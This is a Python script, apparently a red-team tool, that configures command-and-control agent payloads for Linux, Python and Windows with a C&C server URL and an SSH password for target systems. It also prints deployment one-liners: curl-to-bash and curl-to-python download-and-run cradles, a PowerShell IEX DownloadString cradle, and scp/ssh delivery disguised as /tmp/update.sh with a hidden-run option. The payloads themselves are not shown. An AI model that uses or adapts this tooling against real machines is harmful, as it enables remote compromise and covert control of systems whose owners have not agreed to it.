#!/usr/bin/env python3
"""
Payload Builder & Deployment Tool
Quickly configure and deploy red team agents
"""

import os
import sys
import argparse
from pathlib import Path

def configure_payload(payload_path, cnc_server, ssh_password):
    """Configure a payload with C&C server and credentials"""
    print(f"[*] Configuring {payload_path}...")
    
    with open(payload_path, 'r') as f:
        content = f.read()
    
    # Replace placeholders
    if 'python' in payload_path.lower():
        content = content.replace('CNC_SERVER = os.environ.get(\'CNC_SERVER\', \'http://192.168.1.10:5000\')', 
                                f'CNC_SERVER = os.environ.get(\'CNC_SERVER\', \'{cnc_server}\')')
        content = content.replace('SSH_PASSWORD = os.environ.get(\'SSH_PASSWORD\', \'CHANGE_ME\')', 
                                f'SSH_PASSWORD = os.environ.get(\'SSH_PASSWORD\', \'{ssh_password}\')')
    elif payload_path.endswith('.sh'):
        content = content.replace('CNC_SERVER="${CNC_SERVER:-${1:-http://192.168.1.10:5000}}"',
                                f'CNC_SERVER="${{CNC_SERVER:-${{1:-{cnc_server}}}}}"')
        content = content.replace('SSH_PASSWORD="${SSH_PASSWORD:-CHANGE_ME}"',
                                f'SSH_PASSWORD="${{SSH_PASSWORD:-{ssh_password}}}"')
    elif payload_path.endswith('.ps1'):
        content = content.replace('if (-not $CncServer) { $CncServer = "http://192.168.1.10:5000" }',
                                f'if (-not $CncServer) {{ $CncServer = "{cnc_server}" }}')
        content = content.replace('if (-not $SshPassword) { $SshPassword = "CHANGE_ME" }',
                                f'if (-not $SshPassword) {{ $SshPassword = "{ssh_password}" }}')
    
    # Write configured payload
    output_path = payload_path.replace('.', '_configured.')
    with open(output_path, 'w') as f:
        f.write(content)
    
    # Make executable (Unix-like)
    if not payload_path.endswith('.ps1'):
        os.chmod(output_path, 0o755)
    
    print(f"[+] Configured payload saved to: {output_path}")
    return output_path

def generate_deployment_command(payload_path, cnc_server):
    """Generate one-liner deployment commands"""
    filename = os.path.basename(payload_path)
    
    commands = []
    
    if payload_path.endswith('.sh'):
        commands.append("# Direct execution:")
        commands.append(f"curl http://YOUR_SERVER/{filename} | bash")
        commands.append("\n# With SSH transfer:")
        commands.append(f"scp {filename} user@target:/tmp/update.sh")
        commands.append("ssh user@target 'bash /tmp/update.sh'")
        
    elif payload_path.endswith('.py'):
        commands.append("# Direct execution:")
        commands.append(f"curl http://YOUR_SERVER/{filename} | python3")
        commands.append("\n# With parameters:")
        commands.append(f"python3 {filename} --server {cnc_server} --daemon")
        
    elif payload_path.endswith('.ps1'):
        commands.append("# Direct execution:")
        commands.append(f"IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/{filename}')")
        commands.append("\n# Local execution:")
        commands.append(f".\\{filename} -Hidden -CncServer '{cnc_server}'")
    
    return "\n".join(commands)

def main():
    parser = argparse.ArgumentParser(
        description='Red Team Payload Builder',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Configure all payloads
  python build_payload.py --all --server http://10.0.0.1:5000 --password MyP@ss123
  
  # Configure specific payload
  python build_payload.py --payload linux_agent.sh --server http://10.0.0.1:5000 --password test123
  
  # Generate deployment commands
  python build_payload.py --payload windows_agent.ps1 --server http://10.0.0.1:5000 --password test123 --commands
        """
    )
    
    parser.add_argument('--server', required=True, help='C&C server URL (e.g., http://10.0.0.1:5000)')
    parser.add_argument('--password', required=True, help='SSH password for target systems')
    parser.add_argument('--payload', help='Specific payload to configure (e.g., linux_agent.sh)')
    parser.add_argument('--all', action='store_true', help='Configure all payloads')
    parser.add_argument('--commands', action='store_true', help='Generate deployment commands')
    parser.add_argument('--output-dir', default='./configured_payloads', help='Output directory for configured payloads')
    
    args = parser.parse_args()
    
    # Validate inputs
    if not args.server.startswith('http'):
        print("[!] Error: Server URL must start with http:// or https://")
        sys.exit(1)
    
    # Create output directory
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Determine which payloads to configure
    payloads_dir = Path('payloads')
    if not payloads_dir.exists():
        print("[!] Error: payloads directory not found")
        sys.exit(1)
    
    if args.all:
        payloads = [
            payloads_dir / 'python_agent.py',
            payloads_dir / 'linux_agent.sh',
            payloads_dir / 'windows_agent.ps1'
        ]
    elif args.payload:
        payload_path = payloads_dir / args.payload
        if not payload_path.exists():
            print(f"[!] Error: Payload not found: {payload_path}")
            sys.exit(1)
        payloads = [payload_path]
    else:
        print("[!] Error: Specify --payload or --all")
        parser.print_help()
        sys.exit(1)
    
    # Configure payloads
    print("\n" + "="*60)
    print("Red Team Payload Builder")
    print("="*60)
    print(f"C&C Server: {args.server}")
    print(f"SSH Password: {'*' * len(args.password)}")
    print(f"Output Directory: {args.output_dir}")
    print("="*60 + "\n")
    
    configured_payloads = []
    for payload in payloads:
        if payload.exists():
            output_path = Path(args.output_dir) / payload.name
            
            # Read original
            with open(payload, 'r') as f:
                content = f.read()
            
            # Replace configuration
            if 'python' in payload.name:
                content = content.replace('http://192.168.1.10:5000', args.server)
                content = content.replace('CHANGE_ME', args.password)
            elif payload.name.endswith('.sh'):
                content = content.replace('http://192.168.1.10:5000', args.server)
                content = content.replace('CHANGE_ME', args.password)
            elif payload.name.endswith('.ps1'):
                content = content.replace('http://192.168.1.10:5000', args.server)
                content = content.replace('CHANGE_ME', args.password)
            
            # Write configured version
            with open(output_path, 'w') as f:
                f.write(content)
            
            # Make executable
            if not payload.name.endswith('.ps1'):
                os.chmod(output_path, 0o755)
            
            print(f"[+] Configured: {output_path}")
            configured_payloads.append(output_path)
    
    # Generate deployment commands if requested
    if args.commands:
        print("\n" + "="*60)
        print("Deployment Commands")
        print("="*60 + "\n")
        
        for payload in configured_payloads:
            print(f"### {payload.name} ###\n")
            print(generate_deployment_command(str(payload), args.server))
            print("\n")
    
    print("\n[+] Configuration complete!")
    print(f"[*] Configured payloads are in: {args.output_dir}")
    print("\n[!] Remember: Only use on authorized systems with proper permission!")

if __name__ == '__main__':
    main()
